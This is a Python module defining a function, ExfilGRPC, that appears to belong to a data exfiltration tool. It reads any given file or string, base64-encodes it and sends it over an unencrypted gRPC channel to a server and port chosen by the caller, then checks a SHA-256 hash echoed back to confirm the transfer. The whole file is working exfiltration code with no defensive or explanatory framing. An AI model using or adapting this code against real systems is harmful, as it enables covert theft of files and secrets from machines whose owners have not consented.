import grpc
import base64
import os
import hashlib
import logging
from servers.grpc import exfil_pb2_grpc, exfil_pb2

def ExfilGRPC(server, port, data, File=False):
    logging.debug("Using gRPC exfiltration")
    channel = grpc.insecure_channel(server + ":" + str(port))
    stub = exfil_pb2_grpc.ExfilServiceStub(channel)
    logging.debug("Set up gRPC channel")

    if not File:
        if isinstance(data, list):
            logging.debug("data is a list, converting to string")
            data = ','.join(data)
            data = data.encode('utf-8')
        else:
            logging.debug("data is a string")
            data = data.encode('utf-8')
    else:
        logging.debug("data is a file")
        if data == "":
            logging.error("No file")
            return False
        else:
            if not os.path.isfile(data):
                logging.error("Bad filepath")
                return False
            else:
                logging.debug("Reading file")
                data = open(data, "rb").read()

    data_b64 = base64.b64encode(data).decode('utf-8')

    response = stub.SendExfilData(exfil_pb2.ExfilRequest(data=data_b64))

    # Calculate the hash of the original data
    hash_object = hashlib.sha256(data_b64.encode())
    original_hash = hash_object.hexdigest()

    # Check if the received hash matches the original hash
    if response.message == original_hash:
        logging.debug("Data exfiltration successful!")
        return True
    else:
        logging.warning("Data exfiltration failed, hashes do not match!")
        return False